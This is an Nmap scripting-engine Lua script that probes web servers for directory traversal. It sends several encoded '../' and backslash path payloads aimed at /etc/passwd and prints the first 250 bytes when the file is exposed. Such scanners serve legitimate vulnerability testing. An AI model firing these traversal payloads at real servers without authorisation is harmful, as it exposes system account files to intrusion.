-- HTTP probe for /etc/passwd

-- 07/20/2007:
--   * Used Thomas Buchanan's HTTPAuth script as a starting point
--   * Applied some great suggestions from Brandon Enright, thanks a lot man!
--
-- 01/31/2008:
--   * Rewritten to use Sven Klemm's excellent HTTP library and to do some much
--     needed cleaning up

id = "HTTP directory traversal passwd probe"

description = "Probe for /etc/passwd if server is susceptible to directory traversal"

author = "Kris Katterjohn <katterjohn@gmail.com>"

license = "Look at Nmap's COPYING"

categories = {"intrusive"}

require "shortport"
require "http"

-- Check for valid return code and passwd format in body
local validate = function(response)
	if not response.status then
		return nil
	end

	if response.status ~= 200 then
		return nil
	end

	if not response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") then
		return nil
	end

	return response.body
end

local hexify = function(str)
	local ret
	ret = str:gsub("%.", "%%2E")
	ret = ret:gsub("/", "%%2F")
	ret = ret:gsub("\\", "%%5C")
	return ret
end

-- Returns truncated passwd file and returned length
local truncatePasswd = function(passwd)
	local len = 250
	return passwd:sub(1, len), len
end

local output = function(passwd, dir)
	local trunc, len = truncatePasswd(passwd)
	local out = ""
	out = out .. "Found with \"" .. dir .. "\"\n"
	out = out .. "Printing first " .. len .. " bytes:\n"
	out = out .. trunc
	return out
end

portrule = shortport.port_or_service({80, 443, 8080}, {"http", "https"})

action = function(host, port)
	local dirs = {
		"//etc/passwd",
		string.rep("../", 10) .. "etc/passwd",
		"." .. string.rep("../", 10) .. "etc/passwd",
		string.rep("..\\/", 10) .. "etc\\/passwd",
		string.rep("..\\", 10) .. "etc\\passwd"
	}

	for _, dir in ipairs(dirs) do
		local response = http.get(host, port, hexify(dir))

		if validate(response) then
			return output(response.body, dir)
		end
	end

	return
end

